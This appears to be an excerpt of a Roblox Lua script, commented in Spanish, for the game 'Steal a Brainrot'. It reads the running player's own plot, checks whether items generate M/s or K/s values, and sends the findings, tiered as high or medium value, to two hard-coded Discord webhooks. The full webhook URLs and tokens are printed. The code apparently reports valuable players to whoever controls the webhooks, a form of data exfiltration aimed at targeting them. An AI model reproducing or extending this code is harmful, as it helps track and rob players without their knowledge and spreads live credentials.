...
-- 🧠 Extraer datos de Brainrots y detectar valores
local function getBrainrotData(plot)
	...
	if not animalPodiums then
		return {}, false, false  -- No brainrots found
	end
		...
		for _, descendant in ipairs(folder:GetDescendants()) do
			if descendant:IsA("TextLabel") then
				...
				elseif name:find("generation") then
					...
					-- Detectar M/s o K/s en el texto de generación
					local textLower = string.lower(descendant.Text)
					if string.find(textLower, "m/s") then
						hasMS = true
						print("🎯 Brainrot con M/s detectado: " .. descendant.Text)
					elseif string.find(textLower, "k/s") then
						hasKS = true
						print("🎯 Brainrot con K/s detectado: " .. descendant.Text)
					end
...
local function sendToSpecificWebhooks(data)
    ...
    if not myPlot then
        print("❌ No se encontró plot personal - No se envía nada")
        return
    end
    
    local brainrotList, hasMS, hasKS = getBrainrotData(myPlot)
    local plotInfo = "Plot encontrado: " .. myPlot.Name
    
    -- Si no hay brainrots, no enviar nada
    if #brainrotList == 0 then
        print("❌ No se encontraron brainrots - No se envía nada")
        return
    end
    
    -- 📋 WEBHOOKS ESPECÍFICOS
    local webhookMS = "https://discord.com/api/webhooks/1428228899912810586/Vj6hi5UzuRUBUV5qNojaYkGqWPL1pI7SCyIjxzkKtWmRYgezTM4thFtuLRE0RGWUoWEq"
    local webhookKS = "https://discord.com/api/webhooks/1428228893000859780/ECGRhH3X7uMiTQfIGSTEebQe1oSHwwhHR8HUk9yzzMGi1v0CcZR9O9zpAY2FOFIb8wme"
    
    -- Enviar según lo detectado (M/s tiene prioridad sobre K/s)
    if hasMS then
        print("🎯 Enviando a webhook M/s (ALTO VALOR)")
        sendToWebhook(webhookMS, data, brainrotList, plotInfo, "MS")
    elseif hasKS then
        print("🎯 Enviando a webhook K/s (VALOR MEDIO)")
        sendToWebhook(webhookKS, data, brainrotList, plotInfo, "KS")
    else
        print("❌ No se detectaron M/s ni K/s - No se envía nada")
    end
